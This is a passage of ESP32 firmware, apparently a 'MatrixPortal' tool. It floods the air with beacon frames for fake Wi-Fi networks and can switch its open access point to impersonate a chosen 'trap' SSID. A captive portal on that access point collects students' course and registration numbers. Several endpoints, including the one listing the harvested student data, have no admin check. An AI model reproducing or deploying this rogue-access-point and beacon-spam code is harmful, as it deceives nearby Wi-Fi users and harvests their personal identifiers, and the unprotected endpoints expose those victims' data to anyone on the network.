        server.send_P(200, "text/html", SUCCESS_HTML);
    } else {
        server.sendHeader("Location", "/login");
        server.send(302, "text/plain", "");
    }
}

void handleLoginPage() {
    server.send_P(200, "text/html", LOGIN_HTML);
}

void handleAdminPage() {
    if (!checkAdmin()) return;
    server.send_P(200, "text/html", ADMIN_HTML);
}

void handleNotFound() {
    server.sendHeader("Location", "/login");
    server.send(302, "text/plain", "");
}

// ==================== HANDLERS: API LOGIN (ALUNO) ====================
void handleLoginSubmit() {
    if (!server.hasArg("curso") || !server.hasArg("matricula")) {
        server.send(400, "application/json", "{\"status\":\"error\",\"message\":\"Dados incompletos\"}");
        return;
    }
    String curso = sanitize(server.arg("curso"));
    String matricula = sanitize(server.arg("matricula"));
    if (curso.length() == 0 || matricula.length() == 0) {
        server.send(400, "application/json", "{\"status\":\"error\",\"message\":\"Campos vazios\"}");
        return;
    }
    if (students.size() >= 500) {
        server.send(400, "application/json", "{\"status\":\"error\",\"message\":\"Limite de alunos atingido\"}");
        return;
    }
    Student s;
    s.id = nextStudentId++;
    s.curso = curso;
    s.matricula = matricula;
    s.timestamp = getTimestamp();
    students.push_back(s);
    saveStudents();
    addAuthenticated(server.client().remoteIP());
    Serial.printf("[LOGIN] #%d | %s | %s\n", s.id, s.curso.c_str(), s.matricula.c_str());
    server.send(200, "application/json", "{\"status\":\"ok\"}");
}

// ==================== HANDLERS: API REDES ====================
void handleListNetworks() {
    String json = "[";
    for (size_t i = 0; i < networks.size(); i++) {
        if (i > 0) json += ",";
        json += "{\"id\":" + String(networks[i].id);
        json += ",\"ssid\":\"" + jsonEscape(networks[i].ssid) + "\"";
        json += ",\"ch\":" + String(networks[i].channel);
        json += ",\"en\":" + String(networks[i].enabled ? "true" : "false") + "}";
    }
    json += "]";
    server.send(200, "application/json", json);
}

void handleAddNetwork() {
    if (!checkAdmin()) return;
    if (!server.hasArg("ssid") || !server.hasArg("channel")) {
        server.send(400, "application/json", "{\"status\":\"error\",\"message\":\"Dados incompletos\"}");
        return;
    }
    if ((int)networks.size() >= MAX_NETWORKS) {
        server.send(400, "application/json", "{\"status\":\"error\",\"message\":\"Limite de 255 redes\"}");
        return;
    }
    String ssid = sanitize(server.arg("ssid"));
    int ch = server.arg("channel").toInt();
    if (ssid.length() == 0 || ssid.length() > 32) {
        server.send(400, "application/json", "{\"status\":\"error\",\"message\":\"SSID inválido\"}");
        return;
    }
    if (ch < 1 || ch > 13) {
        server.send(400, "application/json", "{\"status\":\"error\",\"message\":\"Canal inválido\"}");
        return;
    }
    CustomNetwork n;
    n.id = nextNetworkId++;
    n.ssid = ssid;
    n.channel = ch;
    n.enabled = true;
    n.mac[0] = 0x02;
    n.mac[1] = (n.id >> 8) & 0xFF;
    n.mac[2] = n.id & 0xFF;
    n.mac[3] = (n.id * 7) & 0xFF;
    n.mac[4] = (n.id * 13) & 0xFF;
    n.mac[5] = (n.id * 17) & 0xFF;
    networks.push_back(n);
    saveNetworks();
    server.send(200, "application/json", "{\"status\":\"ok\",\"id\":" + String(n.id) + "}");
}

void handleUpdateNetwork() {
    if (!checkAdmin()) return;
    if (!server.hasArg("id") || !server.hasArg("ssid")) {
        server.send(400, "application/json", "{\"status\":\"error\",\"message\":\"Dados incompletos\"}");
        return;
    }
    int id = server.arg("id").toInt();
    String ssid = sanitize(server.arg("ssid"));
    if (ssid.length() == 0 || ssid.length() > 32) {
        server.send(400, "application/json", "{\"status\":\"error\",\"message\":\"SSID inválido\"}");
        return;
    }
    for (auto& n : networks) {
        if (n.id == id) {
            // Se era a trap ativa e mudou o nome, remove trap
            if (activeTrapSSID == n.ssid && n.ssid != ssid) {
                activeTrapSSID = "";
                saveConfig();
                restartAPWithSSID(DEFAULT_ADMIN_SSID, 1);
            }
            n.ssid = ssid;
            saveNetworks();
            server.send(200, "application/json", "{\"status\":\"ok\"}");
            return;
        }
    }
    server.send(404, "application/json", "{\"status\":\"error\",\"message\":\"Rede não encontrada\"}");
}

void handleDeleteNetwork() {
    if (!checkAdmin()) return;
    if (!server.hasArg("id")) {
        server.send(400, "application/json", "{\"status\":\"error\",\"message\":\"ID ausente\"}");
        return;
    }
    int id = server.arg("id").toInt();
    for (auto it = networks.begin(); it != networks.end(); ++it) {
        if (it->id == id) {
            if (activeTrapSSID == it->ssid) {
                activeTrapSSID = "";
                saveConfig();
                restartAPWithSSID(DEFAULT_ADMIN_SSID, 1);
            }
            networks.erase(it);
            saveNetworks();
            server.send(200, "application/json", "{\"status\":\"ok\"}");
            return;
        }
    }
    server.send(404, "application/json", "{\"status\":\"error\",\"message\":\"Rede não encontrada\"}");
}

void handleToggleNetwork() {
    if (!checkAdmin()) return;
    if (!server.hasArg("id") || !server.hasArg("enabled")) {
        server.send(400, "application/json", "{\"status\":\"error\",\"message\":\"Dados incompletos\"}");
        return;
    }
    int id = server.arg("id").toInt();
    bool en = server.arg("enabled").toInt() != 0;
    for (auto& n : networks) {
        if (n.id == id) {
            n.enabled = en;
            saveNetworks();
            server.send(200, "application/json", "{\"status\":\"ok\"}");
            return;
        }
    }
    server.send(404, "application/json", "{\"status\":\"error\",\"message\":\"Rede não encontrada\"}");
}

void handleSetTrap() {
    if (!checkAdmin()) return;
    // Modo "clear"
    if (server.hasArg("clear")) {
        activeTrapSSID = "";
        saveConfig();
        restartAPWithSSID(DEFAULT_ADMIN_SSID, 1);
        server.send(200, "application/json",
            "{\"status\":\"ok\",\"ssid\":\"" + String(DEFAULT_ADMIN_SSID) + "\"}");
        return;
    }
    if (!server.hasArg("id")) {
        server.send(400, "application/json", "{\"status\":\"error\",\"message\":\"ID ausente\"}");
        return;
    }
    int id = server.arg("id").toInt();
    for (const auto& n : networks) {
        if (n.id == id) {
            activeTrapSSID = n.ssid;
            saveConfig();
            restartAPWithSSID(n.ssid, n.channel);
            server.send(200, "application/json",
                "{\"status\":\"ok\",\"ssid\":\"" + jsonEscape(n.ssid) + "\"}");
            return;
        }
    }
    server.send(404, "application/json", "{\"status\":\"error\",\"message\":\"Rede não encontrada\"}");
}

// ==================== HANDLERS: API ALUNOS ====================
void handleListStudents() {
    String json = "[";
    for (size_t i = 0; i < students.size(); i++) {
        if (i > 0) json += ",";
        json += "{\"id\":" + String(students[i].id);
        json += ",\"curso\":\"" + jsonEscape(students[i].curso) + "\"";
        json += ",\"matricula\":\"" + jsonEscape(students[i].matricula) + "\"";
        json += ",\"timestamp\":\"" + jsonEscape(students[i].timestamp) + "\"}";
    }
    json += "]";
    server.send(200, "application/json", json);
}

void handleAddStudent() {
    if (!checkAdmin()) return;
    if (!server.hasArg("curso") || !server.hasArg("matricula")) {
        server.send(400, "application/json", "{\"status\":\"error\",\"message\":\"Dados incompletos\"}");
        return;
    }
    String curso = sanitize(server.arg("curso"));
    String matricula = sanitize(server.arg("matricula"));
    if (curso.length() == 0 || matricula.length() == 0) {
        server.send(400, "application/json", "{\"status\":\"error\",\"message\":\"Campos vazios\"}");
        return;
    }
    Student s;
    s.id = nextStudentId++;
    s.curso = curso;
    s.matricula = matricula;
    s.timestamp = getTimestamp();
    students.push_back(s);
    saveStudents();
    server.send(200, "application/json", "{\"status\":\"ok\",\"id\":" + String(s.id) + "}");
}

void handleUpdateStudent() {
    if (!checkAdmin()) return;
    if (!server.hasArg("id") || !server.hasArg("curso") || !server.hasArg("matricula")) {
        server.send(400, "application/json", "{\"status\":\"error\",\"message\":\"Dados incompletos\"}");
        return;
    }
    int id = server.arg("id").toInt();
    String curso = sanitize(server.arg("curso"));
    String matricula = sanitize(server.arg("matricula"));
    if (curso.length() == 0 || matricula.length() == 0) {
        server.send(400, "application/json", "{\"status\":\"error\",\"message\":\"Campos vazios\"}");
        return;
    }
    for (auto& s : students) {
        if (s.id == id) {
            s.curso = curso;
            s.matricula = matricula;
            saveStudents();
            server.send(200, "application/json", "{\"status\":\"ok\"}");
            return;
        }
    }
    server.send(404, "application/json", "{\"status\":\"error\",\"message\":\"Aluno não encontrado\"}");
}

void handleDeleteStudent() {
    if (!checkAdmin()) return;
    if (!server.hasArg("id")) {
        server.send(400, "application/json", "{\"status\":\"error\",\"message\":\"ID ausente\"}");
        return;
    }
    int id = server.arg("id").toInt();
    for (auto it = students.begin(); it != students.end(); ++it) {
        if (it->id == id) {
            students.erase(it);
            saveStudents();
            server.send(200, "application/json", "{\"status\":\"ok\"}");
            return;
        }
    }
    server.send(404, "application/json", "{\"status\":\"error\",\"message\":\"Aluno não encontrado\"}");
}

// ==================== HANDLERS: CONFIG ====================
void handleConfigSave() {
    if (!checkAdmin()) return;
    if (server.hasArg("interval")) {
        int iv = server.arg("interval").toInt();
        if (iv >= 50 && iv <= 5000) beaconInterval = iv;
    }
    if (server.hasArg("password")) {
        String p = server.arg("password");
        if (p.length() > 0) adminPassword = p;
    }
    saveConfig();
    server.send(200, "application/json", "{\"status\":\"ok\"}");
}

// ==================== HANDLERS: CONTROLE ====================
void handleStart() {
    if (!checkAdmin()) return;
    spamming = true;
    saveConfig();
    server.send(200, "application/json", "{\"status\":\"started\"}");
}

void handleStop() {
    if (!checkAdmin()) return;
    spamming = false;
    saveConfig();
    server.send(200, "application/json", "{\"status\":\"stopped\"}");
}

void handleStatus() {
    String ssid = activeTrapSSID.length() ? activeTrapSSID : String(DEFAULT_ADMIN_SSID);
    String json = "{";
    json += "\"heap\":" + String(ESP.getFreeHeap()) + ",";
    json += "\"uptime\":" + String(millis() / 1000) + ",";
    json += "\"packets\":" + String(packetCounter) + ",";
    json += "\"spamming\":" + String(spamming ? "true" : "false") + ",";
    json += "\"ssid\":\"" + jsonEscape(ssid) + "\",";
    json += "\"trap\":\"" + jsonEscape(activeTrapSSID) + "\",";
    json += "\"interval\":" + String(beaconInterval);
    json += "}";
    server.send(200, "application/json", json);
}

void handleScan() {
    int n = WiFi.scanNetworks();
    String json = "[";
    for (int i = 0; i < n; i++) {
        if (i > 0) json += ",";
        json += "{\"ssid\":\"" + jsonEscape(WiFi.SSID(i)) + "\",\"rssi\":" + String(WiFi.RSSI(i)) + "}";
    }
    json += "]";
    server.send(200, "application/json", json);
}

// ==================== SETUP ====================
void setup() {
    Serial.begin(115200);
    delay(500);
    Serial.println("\n=== MatrixPortal Iniciando ===");

    // Filesystem
    if (!LittleFS.begin(true)) {
        Serial.println("LittleFS falhou");
    }

    initSystemTime();
    loadConfig();
    loadNetworks();
    loadStudents();

    Serial.printf("Redes: %d | Alunos: %d | Senha admin: %s\n",
                  (int)networks.size(), (int)students.size(),
                  adminPassword.length() ? "(configurada)" : "(vazia)");

    // Modo AP+STA (STA é necessária para esp_wifi_80211_tx)
    WiFi.mode(WIFI_MODE_APSTA);

    // SSID inicial
    String ssid = activeTrapSSID.length() ? activeTrapSSID : String(DEFAULT_ADMIN_SSID);
    uint8_t ch = 1;
    if (activeTrapSSID.length()) {
        for (const auto& n : networks) {
            if (n.ssid == activeTrapSSID) { ch = n.channel; break; }
        }
    }
    WiFi.softAP(ssid.c_str(), NULL, ch);   // ABERTA
    delay(100);
    IPAddress apIP = WiFi.softAPIP();
    Serial.printf("AP '%s' | IP: %s\n", ssid.c_str(), apIP.toString().c_str());

    // DNS captive portal
    dnsServer.start(DNS_PORT, "*", apIP);

    // Rotas
    server.on("/",                  HTTP_GET,    handleRoot);
    server.on("/login",             HTTP_GET,    handleLoginPage);
    server.on("/admin",             HTTP_GET,    handleAdminPage);
    server.on("/api/login",         HTTP_POST,   handleLoginSubmit);
    server.on("/api/networks",      HTTP_GET,    handleListNetworks);
    server.on("/api/networks",      HTTP_POST,   handleAddNetwork);
    server.on("/api/networks",      HTTP_PUT,    handleUpdateNetwork);
    server.on("/api/networks",      HTTP_DELETE, handleDeleteNetwork);
    server.on("/api/networks/toggle",HTTP_POST,  handleToggleNetwork);
    server.on("/api/networks/trap", HTTP_POST,   handleSetTrap);
    server.on("/api/students",      HTTP_GET,    handleListStudents);
    server.on("/api/students",      HTTP_POST,   handleAddStudent);
    server.on("/api/students",      HTTP_PUT,    handleUpdateStudent);
    server.on("/api/students",      HTTP_DELETE, handleDeleteStudent);
    server.on("/api/config",        HTTP_POST,   handleConfigSave);
    server.on("/api/start",         HTTP_POST,   handleStart);
    server.on("/api/stop",          HTTP_POST,   handleStop);
    server.on("/api/status",        HTTP_GET,    handleStatus);
    server.on("/api/scan",          HTTP_GET,    handleScan);
    server.onNotFound(handleNotFound);
    server.begin();

    esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
    Serial.println("Sistema pronto. Painel: http://192.168.4.1/admin");
}

// ==================== LOOP ====================
void loop() {
    server.handleClient();
    dnsServer.processNextRequest();

    if (spamming) {
        unsigned long now = millis();
        if (now - lastBeaconTime >= beaconInterval) {
            lastBeaconTime = now;
            sendAllBeacons();
        }
    }
    delay(5);
}